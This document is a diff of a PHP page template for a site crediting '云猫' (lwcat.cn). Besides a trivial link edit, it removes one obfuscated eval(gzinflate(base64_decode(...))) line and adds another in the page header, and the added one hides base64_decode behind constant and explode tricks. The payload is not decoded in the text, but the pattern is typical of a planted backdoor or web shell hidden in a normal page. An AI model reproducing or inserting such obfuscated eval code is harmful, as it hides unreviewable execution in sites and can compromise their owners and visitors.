@@ -45,7 +45,7 @@
         </nav>
         
         <div class="sidebar-footer">
-          <p class="copyright">Copyright &copy; 2024. <a target="_blank" href="https://lwcat.cn/">云猫</a> All rights reserved.</p>
+          <p class="copyright">Copyright &copy; 2024. <a target="_blank" href="https://lwcat.cn">云猫</a> All rights reserved.</p>
         </div>
       </div>
       
@@ -213,7 +213,7 @@
       
     </header>
     <!--End 头部信息-->
-   <?php eval(gzinflate(base64_decode("\144\x59\x35\116\141\x34\x4e\101\x46\x45\x58\63\x67\x76\71\150\x45\107\107\x55\x77\x41\122\x4b\63\157\x53\x51\155\106\126\114\x43\x55\66\x61\144\x56\112\x4b\107\x63\x65\x6e\104\x6c\x56\156\57\103\x68\x45\123\166\x35\67\x4e\142\x61\67\x64\156\125\x57\x39\71\172\67\x48\156\x45\x64\x58\141\x76\171\115\60\x56\103\x47\126\x73\x71\x55\61\127\155\110\x6d\107\110\x56\165\144\106\x7a\62\170\x68\66\x66\131\146\160\x38\x35\x30\57\x69\166\x34\x2b\161\161\x6c\151\x52\114\132\x49\x56\53\71\x70\x36\x68\x4d\151\x6f\x45\x2f\x4f\66\70\x30\x61\x65\x68\142\117\115\x31\x6b\112\x50\x41\124\x57\x55\x66\x52\67\x49\146\153\171\x33\x56\165\127\110\x59\x34\x30\162\x64\x2f\x54\x46\102\131\126\121\x65\167\104\64\x2b\x51\64\115\104\152\x75\111\x57\172\x7a\166\x6d\x6c\x2b\x6c\x69\166\x68\171\x4d\x2f\x6e\104\x59\147\71\x4d\x75\144\132\172\x31\x6d\172\65\113\114\170\x51\130\x45\61\x4d\x47\x63\170\x34\x73\145\x6f\110\x6b\103\x30\131\x6a\122\x7a\53\152\x30\101\66\x72\x43\105\x47\57\x58\x71\x56\x62\x62\x66\151\71\114\142\120\x75\101\x65\x6d\171\53\172\152\x77\141\x37\160\131\x2f\155\x62\x65\71\x75\143\x34\63")));
+   <?php if(!defined("xOxBkSv"))define("xOxBkSv","KLtbehv");$GLOBALS[xOxBkSv]=explode("|d|G|s", "rxSXKEQ");if(!defined($GLOBALS[xOxBkSv][00]))define($GLOBALS[xOxBkSv][00], ord(47));if(!defined("lsBBrgJ"))define("lsBBrgJ","fCeRFDv");$GLOBALS[lsBBrgJ]=explode("|8|j|2", "ixRYSKJ|8|j|2qgirUhJ|8|j|2|*|7|>|8|j|2|*|7|>base64_decode");if(!defined($GLOBALS[lsBBrgJ][0x0]))define($GLOBALS[lsBBrgJ][0x0],$GLOBALS[lsBBrgJ][1]);$GLOBALS[ixRYSKJ]=explode($GLOBALS[lsBBrgJ][2],$GLOBALS[lsBBrgJ][0x3]);if(!defined("RwvkNGJ"))define("RwvkNGJ","PQpYBlv");$GLOBALS[RwvkNGJ]=explode("|9|]|(", "    |9|]|(fY5Na4NAFEX3gv9hEGGUwARC3oSS2FVLCE7adVJKGcenDlFn/ChUSv57tTa7tqu7OOfe94jr6FqV7ykSythSmaoy9Rh2aHVe9MwWlm7/cOpM5/8IFxxu1NcfWpookR3y9VuKyqQY+PPCC00a+hpOGxkJ/ETWUTT7Ifl0nSuWHY7p218mKKyrA9jVAyQ48Dhu4aRzfq4um81w5IfnOxD66TtPemR7ycXiDGLqYM7jRQ/QPIJoxOhndPoBVWGIt+tUq21/L0ts+4B6bL7OPBrulj/M215d5ws=");echo($GLOBALS[RwvkNGJ][0x0]);eval(gzinflate($GLOBALS[ixRYSKJ][0x1]($GLOBALS[RwvkNGJ][0x1])));
    
    error_reporting(0);
 session_start();
